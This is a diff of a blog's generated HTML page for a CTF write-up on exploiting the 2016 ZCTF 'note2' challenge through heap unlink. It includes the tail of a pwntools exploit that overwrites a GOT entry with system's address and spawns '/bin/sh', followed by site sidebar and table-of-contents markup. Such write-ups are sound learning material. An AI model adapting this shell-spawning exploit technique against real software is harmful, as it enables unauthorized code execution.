addr: '</span>, hex(system_addr)</div><div class="line">	content = p64(system_addr)</div><div class="line">	editnote(<span class="number">0</span>, <span class="number">1</span>, content)</div><div class="line">	gdb.attach(p)</div><div class="line">	p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line">	p.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line">	p.interactive()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">'name:'</span>)</div><div class="line">	p.sendline(<span class="string">'hello'</span>)</div><div class="line">	p.recvuntil(<span class="string">'address:'</span>)</div><div class="line">	p.sendline(<span class="string">'hello'</span>)</div><div class="line">	unlink()</div><div class="line">	system()</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
+<p>接下来 .. 再做一遍 freenote 吧，真的老是忘。还有各种坑要填</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/</a></p>
 
       
     </div>
@@ -555,8 +592,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -701,6 +747,22 @@
       </section>
 
       
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink"><span class="nav-number">1.</span> <span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序"><span class="nav-number">2.</span> <span class="nav-text">分析程序</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#add"><span class="nav-number">2.1.</span> <span class="nav-text">add</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#show"><span class="nav-number">2.2.</span> <span class="nav-text">show</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#edit"><span class="nav-number">2.3.</span> <span class="nav-text">edit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#free"><span class="nav-number">2.4.</span> <span class="nav-text">free</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞"><span class="nav-number">3.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">4.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#unlink-1"><span class="nav-number">4.1.</span> <span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#泄露libc-地址"><span class="nav-number">4.2.</span> <span class="nav-text">泄露libc 地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getshell"><span class="nav-number">4.3.</span> <span class="nav-text">getshell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
 
       
 
@@ -728,7 +790,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="Symbols count total">106k</span>
+    <span title="Symbols count total">115k</span>
   
 
   
@@ -737,7 +799,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="Reading time total">1:36</span>
+    <span title="Reading time total">1:44</span>
   
 </div>
 
@@ -875,7 +937,7 @@
       var disqus_config = function () {
         this.page.url = 'https://yuuoniy.github.io/2018/04/05/2016 ZCTF note2/';
         this.page.identifier = '2018/04/05/2016 ZCTF note2/';
-        this.page.title = '2016 ZCTF note2';
+        this.page.title = 'CTF | 2016 ZCTF note2';
         };
       function loadComments () {
         var d = document, s = d.createElement('script');
